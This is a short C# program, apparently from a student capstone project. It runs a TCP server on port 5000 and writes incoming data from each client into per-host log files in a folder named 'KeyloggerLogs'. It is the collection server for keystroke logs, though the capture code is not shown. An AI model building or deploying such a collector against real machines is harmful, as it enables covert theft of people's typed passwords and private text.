using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

class Server
{
    static void Main()
    {
        TcpListener server = new TcpListener(IPAddress.Any, 5000);
        server.Start();
        Console.WriteLine("Server started..." + server.LocalEndpoint);

        //IPEndPoint serverIpEndPoint = (IPEndPoint)server.LocalEndpoint;
        //Log directory
        string logDir = "C:\\Users\\abram\\Desktop\\Capstone\\KeyloggerLogs";
        //Directory.CreateDirectory(logDir);


        while (true)
        {
            TcpClient client = server.AcceptTcpClient();
            NetworkStream stream = null;
            StreamWriter writer = null;
            try
            {
                stream = client.GetStream();

                IPEndPoint clientEndPoint = client.Client.RemoteEndPoint as IPEndPoint;

                string clientIp = clientEndPoint.Address.ToString();
                string clientName = Dns.GetHostEntry(clientEndPoint.Address).HostName;

                // Safe filename 
                string safeFileName = $"{clientName}_{clientIp.Replace(".", "_")}.log";
                string logPath = Path.Combine(logDir, safeFileName);

                //Console.WriteLine($"Logging data for {clientName} ({clientIp}) → {logPath}"); 

                writer = new StreamWriter(new FileStream(logPath, FileMode.Append, FileAccess.Write, FileShare.Read));
                //timestamp for new connection
                writer.WriteLine($"\n\n**********{DateTime.Now} {clientName} ({clientIp}) CONNECTED**********\n");

                byte[] buffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    string data = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    writer.Write($"{data}");
                    writer.Flush();
                }
            }

            catch (Exception ex)
            {
                Console.WriteLine($"Error handling client: {ex.Message}");
            }

            finally
            {
                // Dispose everything manually
                if (writer != null)
                    writer.Close(); 
                if (stream != null)
                    stream.Close();
                if (client != null)
                    client.Close();
            }
        }
    }

    static string GetLocalIPAddress()
    {
        foreach (var ip in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
        {
            if (ip.AddressFamily == AddressFamily.InterNetwork)
                return ip.ToString();
        }
        throw new Exception("No network adapters with an IPv4 address in the system!");
    }
}